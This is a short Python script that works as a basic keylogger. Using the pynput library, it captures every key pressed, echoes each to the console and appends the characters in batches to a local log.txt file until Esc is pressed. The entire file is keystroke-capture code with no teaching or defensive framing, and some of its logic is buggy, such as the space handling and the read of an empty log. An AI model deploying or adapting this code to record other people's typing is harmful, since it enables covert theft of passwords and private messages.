# importing pynput to use its functions to capture key inputs
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
   
#breaks out of the loop 
def on_release(key):
    if key == Key.esc:
        return False

def readfile():
    with open('log.txt', 'r') as f:
        lastCharacter = f.read()
            
        if(lastCharacter[-1] == ' '):
            return 'True'
        else:
            return 'False'
    
def write_file(key):
    with open('log.txt', 'a') as f:
        for key in keys:
            
            #removes the quotation marks
            k = str(key).replace("'","")
            
            #removes the word space
            if k == str(Key.space): 
                isTrue = readfile()
                if isTrue == 'True':
                    f.write(' ')
                else:           
                    continue
            if k.find('Key') == -1:
                f.write(k)


if('__main__' == __name__):
    
    print('it works')
    
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

